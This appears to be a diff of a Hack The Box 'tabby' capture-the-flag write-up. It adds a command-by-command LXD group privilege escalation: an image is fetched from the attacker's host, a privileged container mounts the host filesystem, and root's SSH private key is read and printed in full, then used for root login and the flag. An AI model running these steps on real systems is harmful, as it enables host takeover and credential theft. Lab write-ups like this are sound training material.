@@ -589,15 +589,160 @@ c1078b3d1b7c96fe4394817cc528e4f8
 /home/ash/.gnupg/trustdb.gpg                                                                                      
 /home/ash/.gnupg/pubring.kbx                                                                                      
 ```
-* Ran LinEnum.sh
 
 ```
-[+] We're a member of the (lxd) group - could possibly misuse these rights!
-uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
-```
+ash@tabby:~$ wget http://10.10.14.12/alpine-v3.12-x86_64-20201108_2154.tar.gz                                     
+wget http://10.10.14.12/alpine-v3.12-x86_64-20201108_2154.tar.gz                                                  
+--2020-11-09 04:02:03--  http://10.10.14.12/alpine-v3.12-x86_64-20201108_2154.tar.gz                              
+Connecting to 10.10.14.12:80... connected.                                                                        
+HTTP request sent, awaiting response... 200 OK                                                                    
+Length: 3199275 (3.1M)                                                                                            
+Saving to: ‘alpine-v3.12-x86_64-20201108_2154.tar.gz’                                                             
+                                                                                                                  
+alpine-v3.12-x86_64 100%[===================>]   3.05M  1.30MB/s    in 2.3s                                       
+                                                                                                                  
+2020-11-09 04:02:06 (1.30 MB/s) - ‘alpine-v3.12-x86_64-20201108_2154.tar.gz’ saved [3199275/3199275]              
+                                                                                                                  
+ash@tabby:~$ lxd init                                                                                             
+lxd init                                                                                                          
+Would you like to use LXD clustering? (yes/no) [default=no]: no                                                   
+no                                                                                                                
+Do you want to configure a new storage pool? (yes/no) [default=yes]: no                                           
+no                                                                                                                
+Would you like to connect to a MAAS server? (yes/no) [default=no]: no                                             
+no                                                                                                                
+Would you like to create a new local network bridge? (yes/no) [default=yes]: no
+no
+Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: no
+no
+Would you like LXD to be available over the network? (yes/no) [default=no]: no
+no
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes] no
+no
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
+no
+ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20201108_2154.tar.gz --alias alpine
+<ne-v3.12-x86_64-20201108_2154.tar.gz --alias alpine
+ash@tabby:~$ lxc image list
+lxc image list
++--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------
+-----------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPL
+OAD DATE         |
++--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------
+-----------------+
+| alpine | 4bbf00f65d17 | no     | alpine v3.12 (20201108_21:54) | x86_64       | CONTAINER | 3.05MB | Nov 9, 2020
+ at 4:04am (UTC) |
++--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------
+-----------------+
+|        | a48c5c6e3220 | no     | alpine v3.12 (20201108_21:27) | x86_64       | CONTAINER | 2.97MB | Nov 9, 2020
+ at 3:57am (UTC) |
++--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------
+-----------------+
+ash@tabby:~$ lxc init alpine mycontainer -c security.privileged=true
+lxc init alpine mycontainer -c security.privileged=true
+Creating mycontainer
+ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+<ydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+ash@tabby:~$ lxc start mycontainer
+lxc start mycontainer
+ash@tabby:~$ lxc exec mycontainer /bin/sh
+lxc exec mycontainer /bin/sh 
+~ # ^[[29;5Rid
+id
+uid=0(root) gid=0(root)
 
-2.) Then this - sudo ./build-alpine
-3.) If above command run properly without errors then congrats!
-4.) If not maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
-5.) Goto - cd/rootfs/usr/share/alpine-mirrors/Mirrors.txt
-6.) Open that .txt file with any editor and remove all the mirror sites except first one, then save it there only.
+
+cat /mnt/root/root/.ssh/id_rsa                                                                                    
+-----BEGIN OPENSSH PRIVATE KEY-----    
+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
+-----END OPENSSH PRIVATE KEY-----
+
+
+kali@kali:~/HTB/tabby/lxd-alpine-builder$ nano id_rsa
+kali@kali:~/HTB/tabby/lxd-alpine-builder$ chmod 400 id_rsa        
+kali@kali:~/HTB/tabby/lxd-alpine-builder$ ssh -i id_rsa root@10.10.10.194
+
+
+Last login: Wed Jun 17 21:58:30 2020 from 10.10.14.2
+root@tabby:~# whoami
+root
+root@tabby:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@tabby:~# ifconfig
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.194  netmask 255.255.255.0  broadcast 10.10.10.255
+        ether 00:50:56:b9:ea:fc  txqueuelen 1000  (Ethernet)
+        RX packets 6489  bytes 6801208 (6.8 MB)
+        RX errors 0  dropped 11  overruns 0  frame 0
+        TX packets 3743  bytes 391276 (391.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 6040  bytes 429456 (429.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 6040  bytes 429456 (429.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lxdbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.234.81.1  netmask 255.255.255.0  broadcast 0.0.0.0
+        ether ce:a3:b8:4d:61:5d  txqueuelen 1000  (Ethernet)
+        RX packets 44  bytes 4572 (4.5 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 11  bytes 2330 (2.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethb500231a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        ether f6:68:50:45:b7:bc  txqueuelen 1000  (Ethernet)
+        RX packets 16  bytes 1732 (1.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 17  bytes 2358 (2.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethe39319e5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        ether ce:a3:b8:4d:61:5d  txqueuelen 1000  (Ethernet)
+        RX packets 15  bytes 1662 (1.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 4  bytes 816 (816.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@tabby:~# cat /root/root.txt
+f8bb49c68a47f6d4b2f73ac51e032958
